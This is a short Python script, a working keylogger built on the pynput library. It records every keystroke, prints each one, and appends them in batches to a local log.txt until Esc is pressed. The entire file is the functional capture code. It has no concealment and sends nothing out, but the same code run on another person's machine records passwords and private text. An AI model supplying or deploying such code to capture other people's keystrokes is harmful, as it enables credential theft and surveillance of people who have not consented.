import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f'{key} is pressed')
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open ('log.txt', 'a+' ) as f:
        for key in keys:
            no_quotes_key = str(key).replace("'","")
            if no_quotes_key.find("space") > 0:
                f.write(' ')
            elif no_quotes_key.find("Key") == -1:
                f.write(no_quotes_key)
            f.write('\n')

def on_release(key):
    global keys
    if key == Key.esc:
        write_file(keys)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
